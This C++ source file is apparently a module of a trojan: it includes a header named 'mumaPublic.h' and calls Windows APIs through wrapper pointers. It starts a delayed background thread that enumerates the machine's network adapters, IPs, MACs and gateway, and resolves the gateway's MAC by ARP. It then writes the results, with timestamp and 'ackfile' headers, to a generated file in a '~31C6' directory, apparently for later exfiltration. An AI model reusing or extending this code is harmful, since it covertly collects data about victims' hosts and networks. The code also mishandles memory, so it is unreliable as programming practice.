// getAdapterInfo.cpp: implementation of the getAdapterInfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "getAdapterInfo.h"
#include "WinApi.h"
#include "mumaPublic.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

WriteAdapter::WriteAdapter()
{
	SendCount = 0;
	offset    = 1024;
	SendBuf   = new char[ADAPTERLEN*MAXCOUNT+1024];	
	memset(SendBuf, 0, ADAPTERLEN*MAXCOUNT+1024);
}

WriteAdapter::~WriteAdapter()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

BOOL WriteAdapter::WriteBuf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	if(Buflen>0)
	{
		SendCount++;
		
		memcpy(SendBuf+offset, Buf, Buflen);
		offset += Buflen;
	}
	
	//	OutputDebugString("WriteBuf");
	
	if (SendCount >= MAXCOUNT || (bFinish && offset>1024))
	{
		offset += sprintf(SendBuf+offset,"%d",SendCount);

		char tmpbuf[1024];
		
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char laninfofilename[MAX_PATH];
		char laninfofilea[MAX_PATH];
		char FixDir[10];
		strcpy(FixDir, "~31C6");
		CreateFileName(FixDir, laninfofilename, laninfofilea);		// 得到目标文件名
		int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\nackfile: %s\r\ncontent-length: %d\r\ncontent-type: adapterinfo_v1\r\n\r\n",
			nowtime.wYear, nowtime.wMonth, nowtime.wDay,
			nowtime.wHour, nowtime.wMinute, nowtime.wSecond, laninfofilea, offset-1024);
		
		int datalen = offset-1024+len;
		memcpy(SendBuf+1024-len, tmpbuf, len);
		
		WCHAR* pUnicode = new WCHAR[datalen+10];
		datalen = (datalen+10)*sizeof(WCHAR);
		datalen = GB23122Unicode(SendBuf+1024-len, pUnicode, datalen);
		
		datalen *= 4;
		char * pBuffer = new char[datalen];
		memset(pBuffer, 0, datalen);
		datalen = Unicode2UTF_8(pUnicode, pBuffer, datalen-1);
		
		myWriteFile(pBuffer, datalen, laninfofilename, laninfofilea);
		
		delete []pUnicode;
		delete []pBuffer;
		memset(SendBuf, 0, ADAPTERLEN*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		PSleep(2000);
	}
	
	return TRUE;
}

BOOL WriteAdapter::WriteOneData(ULONG lCardIP, const char *szCardMAC, const char *szCardName, const char *szDesc, ULONG lGateIP, const char *szGateMAC)
{
	char buf[ADAPTERLEN];
	DWORD buflen;
	
	buflen = 0;
	memset(buf, 0, ADAPTERLEN);
	buflen = sprintf(buf, "%d\t%s\t%s\t%u\t%u\t%s\t%s\n", SendCount, szCardName, szCardMAC, lCardIP, lGateIP, szGateMAC, szDesc);
	
	WriteBuf(buf, buflen);
	
	return TRUE;
}

BOOL WriteAdapter::WriteEnd()
{
	WriteBuf("", 0, TRUE);
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

GetAdapterInfo::GetAdapterInfo()
{
}

GetAdapterInfo::~GetAdapterInfo()
{
}

BOOL GetAdapterInfo::GetData()
{
    //PIP_ADAPTER_INFO结构体指针存储本机网卡信息
    PIP_ADAPTER_INFO pIpAdapterInfo = new IP_ADAPTER_INFO();
    //得到结构体大小,用于GetAdaptersInfo参数
    unsigned long stSize = sizeof(IP_ADAPTER_INFO);
    //调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量;其中stSize参数既是一个输入量也是一个输出量
    int nRel = PGetAdaptersInfo(pIpAdapterInfo,&stSize);
    //记录网卡数量
    int netCardNum = 0;
    //记录每张网卡上的IP地址数量
    int IPnumPerNetCard = 0;
    if (ERROR_BUFFER_OVERFLOW == nRel)
    {
        //如果函数返回的是ERROR_BUFFER_OVERFLOW
        //则说明GetAdaptersInfo参数传递的内存空间不够,同时其传出stSize,表示需要的空间大小
        //这也是说明为什么stSize既是一个输入量也是一个输出量
        //释放原来的内存空间
        delete pIpAdapterInfo;
        //重新申请内存空间用来存储所有网卡信息
        pIpAdapterInfo = (PIP_ADAPTER_INFO)new BYTE[stSize];
        //再次调用GetAdaptersInfo函数,填充pIpAdapterInfo指针变量
        nRel = PGetAdaptersInfo(pIpAdapterInfo,&stSize);    
    }
    if (ERROR_SUCCESS == nRel)
    {
		WSADATA wsData;  
		PWSAStartup(MAKEWORD(2,2), &wsData); 

		char szAdapterName[260], szDescription[260], szAdapterMAC[20], szGateMAC[20];
		ULONG lAdapterIP, lGateIP;
		int offset;

        //输出网卡信息
		//可能有多网卡,因此通过循环去判断
		while (pIpAdapterInfo)
		{
			strcpy(szAdapterName, pIpAdapterInfo->AdapterName);
			strcpy(szDescription, pIpAdapterInfo->Description);
		
			offset = 0;
			for (DWORD i = 0; i < pIpAdapterInfo->AddressLength; i++)
			{
				if (i < pIpAdapterInfo->AddressLength-1)
				{
					offset += sprintf(szAdapterMAC+offset, "%02X-", pIpAdapterInfo->Address[i]);
				}
				else
				{
					offset += sprintf(szAdapterMAC+offset, "%02X", pIpAdapterInfo->Address[i]);
				}
			}
			if (pIpAdapterInfo->AddressLength == 0)
			{
				memset(szAdapterMAC, 0, 20);
			}

			lAdapterIP = Pntohl(Pinet_addr(pIpAdapterInfo->IpAddressList.IpAddress.String));
			lGateIP = Pntohl(Pinet_addr(pIpAdapterInfo->GatewayList.IpAddress.String));

			memset(szGateMAC, 0, 20);
			GetMac(lGateIP, szGateMAC);

			WriteOneData(lAdapterIP, szAdapterMAC, szAdapterName, szDescription, lGateIP, szGateMAC);

			pIpAdapterInfo = pIpAdapterInfo->Next;
		}
    }
    //释放内存空间
    if (pIpAdapterInfo)
    {
        delete pIpAdapterInfo;
    }

	WriteEnd();

	return TRUE;
}

BOOL GetAdapterInfo::GetMac(DWORD remoteAddr, char * strbuf)
{
	long nRemoteAddr = Phtonl(remoteAddr);
	
	struct in_addr sa;	
	//获取远程机器名
	sa.s_addr = nRemoteAddr;
	
	//发送ARP查询包获得远程MAC地址
	unsigned char macAddress[6];
	ULONG macAddLen = 6;
	
	int iRet = PSendARP(nRemoteAddr, (unsigned long)NULL,(PULONG)&macAddress, &macAddLen);
	if ( iRet == NO_ERROR )
	{
		char str_mac[20];
		char temp[5];
		memset(str_mac, 0, 20);
		for( int i =0; i<6; i++ )
		{
			memset(temp, 0, 5);
			sprintf(temp, "%.2X", macAddress[i]);
			strcat(str_mac, temp);
			if ( i<5 ) 
				strcat(str_mac, "-");
		}
		
		if (str_mac[0] == 0)
		{
			return FALSE;
		}
		
		strcpy(strbuf, str_mac);
	}
	else
		return FALSE;
	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////

DWORD WINAPI ThreadAdapterInfo(LPVOID lp)
{
	Sleep(5000);
	
	GetAdapterInfo AdapterInfo;
	AdapterInfo.GetData();
	
	return 0;
}

DWORD ThreadAdapterInfoStart(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		ThreadAdapterInfo, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}